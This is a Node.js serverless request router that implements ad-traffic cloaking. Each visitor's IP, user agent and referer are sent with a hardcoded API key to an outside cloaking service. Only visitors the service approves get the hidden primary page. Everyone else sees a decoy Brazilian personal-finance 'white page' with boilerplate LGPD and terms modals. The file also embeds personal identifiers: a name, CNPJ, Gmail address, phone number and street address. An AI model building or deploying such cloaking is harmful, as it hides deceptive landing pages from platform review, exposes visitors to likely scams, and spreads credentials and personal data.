// ============================================================
// Server-Side Request Router — Vercel Serverless Function
// Conditional decision routing for root route ("/") + Legal Pages
// ============================================================

const fs = require('fs');
const path = require('path');

const PRIMARY_URL = '';
const CLOAK_SLUG = 'bright-feed';
const CLOAK_KEY = 'lEEv-oRaRLazQL_OLdtoIgOj90h5Pqme';
const CLOAK_ENDPOINT = 'http://cloakforge.app.br/api/cloak/decide';

const COMPANY = {
  razaoSocial: '68.413.071 Gabriel de Souza Duarte',
  cnpj: '68.413.071/0001-50',
  email: 'estrelaesrelinha55@gmail.com',
  telefone: '(66) 5667-8997',
  endereco: 'Rua Marumbi, 44, Bairro Cidade de Deus, Manaus - AM, CEP 69099-299',
  nomePortal: 'Finanças & Cidadania'
};

const VARIANT_B_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal Finanças & Cidadania — Informação e Planejamento Familiar</title>
  <meta name="description" content="Artigos informativos, guias de planejamento orçamentário e orientações sobre direitos básicos do consumidor.">
  <style>
    :root {
      --bg: #f8fafc;
      --surface: #ffffff;
      --primary: #0f172a;
      --accent: #2563eb;
      --text: #334155;
      --muted: #64748b;
      --border: #e2e8f0;
      --radius: 12px;
      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -2px rgba(0, 0, 0, 0.05);
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      line-height: 1.65;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .header-container {
      max-width: 1080px;
      margin: 0 auto;
      padding: 16px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      text-decoration: none;
      color: var(--primary);
      font-weight: 700;
      font-size: 1.15rem;
      letter-spacing: -0.02em;
    }
    .brand-icon {
      width: 32px;
      height: 32px;
      background: var(--accent);
      color: #fff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 800;
      font-size: 0.95rem;
    }
    nav ul {
      display: flex;
      list-style: none;
      gap: 20px;
    }
    nav a {
      color: var(--muted);
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
      transition: color 0.15s;
    }
    nav a:hover { color: var(--accent); }
    main {
      flex: 1;
      max-width: 1080px;
      width: 100%;
      margin: 32px auto;
      padding: 0 20px;
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 36px;
    }
    @media (max-width: 820px) {
      main { grid-template-columns: 1fr; gap: 24px; margin: 20px auto; }
      nav { display: none; }
    }
    article {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 36px;
      box-shadow: var(--shadow);
    }
    @media (max-width: 540px) {
      article { padding: 22px; }
    }
    .article-tag {
      display: inline-block;
      background: #eff6ff;
      color: var(--accent);
      font-size: 0.75rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      padding: 4px 10px;
      border-radius: 999px;
      margin-bottom: 14px;
    }
    h1 {
      color: var(--primary);
      font-size: 1.85rem;
      line-height: 1.3;
      margin-bottom: 12px;
      letter-spacing: -0.02em;
    }
    .meta {
      display: flex;
      gap: 16px;
      color: var(--muted);
      font-size: 0.85rem;
      margin-bottom: 24px;
      padding-bottom: 18px;
      border-bottom: 1px solid var(--border);
    }
    p { margin-bottom: 18px; }
    h2 {
      color: var(--primary);
      font-size: 1.35rem;
      margin: 28px 0 12px;
      letter-spacing: -0.01em;
    }
    .highlight-card {
      background: #f1f5f9;
      border-left: 4px solid var(--accent);
      border-radius: 0 var(--radius) var(--radius) 0;
      padding: 16px 20px;
      margin: 24px 0;
      font-size: 0.95rem;
    }
    ul.tips-list {
      margin: 16px 0 24px 20px;
    }
    ul.tips-list li {
      margin-bottom: 10px;
    }
    aside {
      display: flex;
      flex-direction: column;
      gap: 24px;
    }
    .sidebar-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: var(--shadow);
    }
    .sidebar-title {
      font-size: 1.05rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 14px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 8px;
    }
    .side-links {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 12px;
      font-size: 0.9rem;
    }
    .side-links a {
      color: var(--text);
      text-decoration: none;
      transition: color 0.15s;
    }
    .side-links a:hover { color: var(--accent); }

    /* Footer styling */
    footer {
      background: var(--primary);
      color: #94a3b8;
      font-size: 0.85rem;
      padding: 40px 20px 24px;
      margin-top: auto;
    }
    .footer-container {
      max-width: 1080px;
      margin: 0 auto;
    }
    .footer-grid {
      display: grid;
      grid-template-columns: 2fr 1fr 1fr;
      gap: 32px;
      padding-bottom: 28px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      margin-bottom: 24px;
    }
    @media (max-width: 768px) {
      .footer-grid { grid-template-columns: 1fr; gap: 24px; }
    }
    .footer-heading {
      color: #ffffff;
      font-weight: 700;
      font-size: 0.95rem;
      margin-bottom: 12px;
    }
    .footer-links {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .footer-links a, .footer-links button {
      color: #94a3b8;
      text-decoration: none;
      background: none;
      border: none;
      padding: 0;
      cursor: pointer;
      font-size: 0.85rem;
      text-align: left;
      font-family: inherit;
      transition: color 0.2s;
    }
    .footer-links a:hover, .footer-links button:hover {
      color: #ffffff;
    }
    .company-details p {
      margin-bottom: 6px;
      font-size: 0.82rem;
      line-height: 1.5;
    }
    .footer-bottom {
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 12px;
      font-size: 0.8rem;
    }

    /* Modal Styling */
    .modal-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      z-index: 1000;
      padding: 20px;
      align-items: center;
      justify-content: center;
    }
    .modal-overlay.active {
      display: flex;
    }
    .modal-box {
      background: #ffffff;
      color: var(--text);
      max-width: 680px;
      width: 100%;
      max-height: 85vh;
      overflow-y: auto;
      border-radius: var(--radius);
      padding: 32px;
      position: relative;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
    }
    .modal-close {
      position: absolute;
      top: 16px;
      right: 18px;
      background: #f1f5f9;
      border: none;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      font-size: 1.2rem;
      font-weight: 700;
      color: var(--muted);
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .modal-close:hover { background: #e2e8f0; color: var(--primary); }
    .modal-title {
      font-size: 1.35rem;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 16px;
      padding-bottom: 10px;
      border-bottom: 1px solid var(--border);
    }
    .modal-content {
      font-size: 0.9rem;
      line-height: 1.6;
    }
    .modal-content h3 {
      font-size: 1.05rem;
      color: var(--primary);
      margin: 18px 0 6px;
    }
    .modal-content p {
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
  <header>
    <div class="header-container">
      <a href="/" class="brand">
        <span class="brand-icon">FC</span>
        <span>${COMPANY.nomePortal}</span>
      </a>
      <nav>
        <ul>
          <li><a href="/">Início</a></li>
          <li><a href="/" onclick="openModal('privacidade'); return false;">Privacidade</a></li>
          <li><a href="/" onclick="openModal('termos'); return false;">Termos de Uso</a></li>
          <li><a href="/" onclick="openModal('contato'); return false;">Fale Conosco</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main>
    <article>
      <span class="article-tag">Planejamento & Economia</span>
      <h1>Guia Prático: Como Organizar o Orçamento Familiar e Criar Estabilidade Financeira</h1>
      <div class="meta">
        <span>Atualizado em Outubro de 2026</span>
        <span>•</span>
        <span>Tempo de leitura: 4 min</span>
        <span>•</span>
        <span>Redação Editorial</span>
      </div>

      <p>Manter a saúde financeira em equilíbrio exige método, disciplina e compreensão clara dos fluxos de entrada e saída de recursos. Em períodos de oscilação econômica, a estruturação de um orçamento preventivo torna-se a principal ferramenta para proteger o patrimônio e garantir tranquilidade familiar.</p>

      <h2>O Método dos Três Blocos Orçamentários</h2>
      <p>Uma das abordagens mais consolidadas por consultores e educadores econômicos é a distribuição proporcional da renda líquida familiar em três categorias prioritárias:</p>

      <ul class="tips-list">
        <li><strong>Gastos Essenciais (50% a 60%):</strong> Moradia, alimentação básica, saúde, transporte indispensável e contas de serviços fundamentais.</li>
        <li><strong>Estilo de Vida e Conforto (20% a 30%):</strong> Lazer, refeições fora de casa, assinaturas e despesas de conveniência.</li>
        <li><strong>Reserva Estratégica (15% a 20%):</strong> Formação de reserva de liquidez imediata para imprevistos e metas de médio prazo.</li>
      </ul>

      <div class="highlight-card">
        <strong>Recomendação Prática:</strong> A reserva de emergência deve cobrir entre 3 a 6 meses do custo de vida básico familiar e precisa estar alocada em aplicações de alta liquidez e baixo risco.
      </div>

      <h2>Prevenção e Conscientização no Uso do Crédito</h2>
      <p>O crédito ao consumidor pode ser um instrumento de desenvolvimento quando utilizado com planejamento, mas demanda atenção redobrada aos custos efetivos totais (CET). Recomenda-se avaliar taxas contratuais, juros rotativos e evitar comprometer mais de 30% da renda mensal com parcelamentos cumulativos.</p>

      <h2>Direitos Básicos do Consumidor</h2>
      <p>O Código de Defesa do Consumidor assegura o direito à informação clara, transparência nas faturas e acesso facilitado aos canais de atendimento das instituições financeiras e de prestação de serviços. Em caso de dúvidas sobre cobranças, procure sempre formalizar solicitações através dos canais de protocolo e ouvidorias competentes.</p>
    </article>

    <aside>
      <div class="sidebar-card">
        <div class="sidebar-title">Tópicos Relacionados</div>
        <ul class="side-links">
          <li><a href="/">• Como calcular o Custo Efetivo Total (CET)</a></li>
          <li><a href="/">• Guia para redução de despesas fixas mensais</a></li>
          <li><a href="/">• Planejamento previdenciário e poupança de longo prazo</a></li>
          <li><a href="/">• Conscientização contra fraudes eletrônicas comuns</a></li>
        </ul>
      </div>

      <div class="sidebar-card">
        <div class="sidebar-title">Atendimento Institucional</div>
        <p style="font-size: 0.88rem; color: var(--muted); margin-bottom: 12px;">
          Dúvidas sobre o conteúdo ou solicitações de titulares de dados? Entre em contato com nosso encarregado.
        </p>
        <p style="font-size: 0.85rem; color: var(--primary); font-weight: 600;">
          E-mail: ${COMPANY.email}<br>
          Tel: ${COMPANY.telefone}
        </p>
      </div>
    </aside>
  </main>

  <footer>
    <div class="footer-container">
      <div class="footer-grid">
        <div class="company-details">
          <div class="footer-heading">${COMPANY.nomePortal}</div>
          <p><strong>Razão Social:</strong> ${COMPANY.razaoSocial}</p>
          <p><strong>CNPJ:</strong> ${COMPANY.cnpj}</p>
          <p><strong>Endereço:</strong> ${COMPANY.endereco}</p>
          <p><strong>E-mail de Contato:</strong> <a href="mailto:${COMPANY.email}" style="color: #cbd5e1; text-decoration: underline;">${COMPANY.email}</a></p>
          <p><strong>Telefone:</strong> ${COMPANY.telefone}</p>
        </div>

        <div>
          <div class="footer-heading">Institucional & Jurídico</div>
          <ul class="footer-links">
            <li><button type="button" onclick="openModal('privacidade')">Política de Privacidade</button></li>
            <li><button type="button" onclick="openModal('termos')">Termos de Uso</button></li>
            <li><button type="button" onclick="openModal('lgpd')">Conformidade LGPD</button></li>
            <li><button type="button" onclick="openModal('contato')">Canal de Contato</button></li>
          </ul>
        </div>

        <div>
          <div class="footer-heading">Compromisso Editorial</div>
          <p style="font-size: 0.82rem; line-height: 1.5; color: #94a3b8;">
            Este portal tem caráter estritamente educativo e informativo sobre finanças pessoais e cidadania. Conteúdo em conformidade com as diretrizes de transparência digital.
          </p>
        </div>
      </div>

      <div class="footer-bottom">
        <div>© 2026 ${COMPANY.razaoSocial} — Todos os direitos reservados.</div>
        <div>CNPJ: ${COMPANY.cnpj} • Manaus - AM</div>
      </div>
    </div>
  </footer>

  <div class="modal-overlay" id="modal-privacidade" onclick="if(event.target === this) closeModal('privacidade')">
    <div class="modal-box">
      <button class="modal-close" onclick="closeModal('privacidade')">&times;</button>
      <div class="modal-title">Política de Privacidade e Proteção de Dados (LGPD)</div>
      <div class="modal-content">
        <p>A presente Política de Privacidade regula o tratamento dos dados coletados pelos canais do <strong>${COMPANY.nomePortal}</strong>, operado por <strong>${COMPANY.razaoSocial}</strong>, inscrita no CNPJ sob o nº <strong>${COMPANY.cnpj}</strong>, com sede em <strong>${COMPANY.endereco}</strong>.</p>
        <h3>1. Princípios e Conformidade</h3>
        <p>Atuamos em total conformidade com a Lei Geral de Proteção de Dados Pessoais (Lei nº 13.709/2018 - LGPD).</p>
        <h3>2. Dados Coletados</h3>
        <p>Coletamos dados técnicos genéricos para análise e prevenção a fraudes eletrônicas.</p>
        <h3>3. Direitos do Titular</h3>
        <p>Solicitações podem ser encaminhadas ao e-mail <strong>${COMPANY.email}</strong>.</p>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modal-termos" onclick="if(event.target === this) closeModal('termos')">
    <div class="modal-box">
      <button class="modal-close" onclick="closeModal('termos')">&times;</button>
      <div class="modal-title">Termos e Condições de Uso</div>
      <div class="modal-content">
        <p>Seja bem-vindo ao <strong>${COMPANY.nomePortal}</strong>, operado por <strong>${COMPANY.razaoSocial}</strong> (CNPJ <strong>${COMPANY.cnpj}</strong>).</p>
        <h3>1. Finalidade Informativa</h3>
        <p>Conteúdo estritamente educativo sobre planejamento financeiro familiar.</p>
        <h3>2. Foro de Eleição</h3>
        <p>Foro da Comarca de Manaus, Estado do Amazonas.</p>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modal-contato" onclick="if(event.target === this) closeModal('contato')">
    <div class="modal-box">
      <button class="modal-close" onclick="closeModal('contato')">&times;</button>
      <div class="modal-title">Canal de Contato Institucional</div>
      <div class="modal-content">
        <p><strong>Empresa:</strong> ${COMPANY.razaoSocial}</p>
        <p><strong>CNPJ:</strong> ${COMPANY.cnpj}</p>
        <p><strong>Endereço:</strong> ${COMPANY.endereco}</p>
        <p><strong>E-mail:</strong> <a href="mailto:${COMPANY.email}">${COMPANY.email}</a></p>
        <p><strong>Telefone:</strong> ${COMPANY.telefone}</p>
      </div>
    </div>
  </div>

  <script>
    function openModal(id) {
      if (id === 'lgpd') id = 'privacidade';
      var el = document.getElementById('modal-' + id);
      if (el) el.classList.add('active');
    }
    function closeModal(id) {
      var el = document.getElementById('modal-' + id);
      if (el) el.classList.remove('active');
    }
  </script>
</body>
</html>`;

function resolveClientIp(req) {
  const h = req.headers;
  const cf = h['cf-connecting-ip'];
  if (cf && typeof cf === 'string' && cf.trim()) return cf.trim();

  const trueIp = h['true-client-ip'];
  if (trueIp && typeof trueIp === 'string' && trueIp.trim()) return trueIp.trim();

  const vercelIp = h['x-vercel-forwarded-for'];
  if (vercelIp && typeof vercelIp === 'string' && vercelIp.trim()) return vercelIp.trim().split(',')[0].trim();

  const realIp = h['x-real-ip'];
  if (realIp && typeof realIp === 'string' && realIp.trim()) return realIp.trim();

  const xff = h['x-forwarded-for'];
  if (xff && typeof xff === 'string' && xff.trim()) {
    const first = xff.split(',')[0].trim();
    if (first) return first;
  }

  const flyIp = h['fly-client-ip'];
  if (flyIp && typeof flyIp === 'string' && flyIp.trim()) return flyIp.trim();

  return req.socket?.remoteAddress || '';
}

module.exports = async function handler(req, res) {
  const host = req.headers.host || 'localhost';
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const fullUrl = `${proto}://${host}${req.url}`;
  const urlObj = new URL(fullUrl);

  const page = req.query?.page || '';
  if (page === 'privacidade' || urlObj.pathname === '/privacidade' || urlObj.pathname === '/politica-de-privacidade') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(VARIANT_B_HTML.replace('</body>', '<script>openModal("privacidade");</script></body>'));
  }
  if (page === 'termos' || urlObj.pathname === '/termos' || urlObj.pathname === '/termos-de-uso') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(VARIANT_B_HTML.replace('</body>', '<script>openModal("termos");</script></body>'));
  }
  if (page === 'contato' || urlObj.pathname === '/contato') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(VARIANT_B_HTML.replace('</body>', '<script>openModal("contato");</script></body>'));
  }

  const clientIp = resolveClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers['referer'] || '';
  const acceptLang = req.headers['accept-language'] || '';

  let decisionAction = 'block';

  try {
    const query = new URLSearchParams({
      slug: CLOAK_SLUG,
      key: CLOAK_KEY,
      ip: clientIp,
      ua: userAgent,
      url: fullUrl,
      ref: referer,
      lang: acceptLang,
    });

    const decideUrl = `${CLOAK_ENDPOINT}?${query.toString()}`;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3500);

    const decideRes = await fetch(decideUrl, {
      method: 'GET',
      headers: { 'Accept': 'application/json' },
      signal: controller.signal
    });
    clearTimeout(timeout);

    if (decideRes.ok) {
      const data = await decideRes.json().catch(() => null);
      if (data && typeof data.action === 'string') {
        decisionAction = data.action.toLowerCase().trim();
      }
    }
  } catch (_) {
    decisionAction = 'block';
  }

  if (decisionAction === 'allow') {
    if (PRIMARY_URL && PRIMARY_URL.trim()) {
      res.writeHead(302, { Location: PRIMARY_URL.trim() });
      return res.end();
    }

    try {
      const indexPath = path.join(process.cwd(), 'index.html');
      if (fs.existsSync(indexPath)) {
        const primaryHtml = fs.readFileSync(indexPath, 'utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.status(200).send(primaryHtml);
      }
    } catch (_) {}
  }

  // Fallback to Variant B (White page) inline
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');
  return res.status(200).send(VARIANT_B_HTML);
};
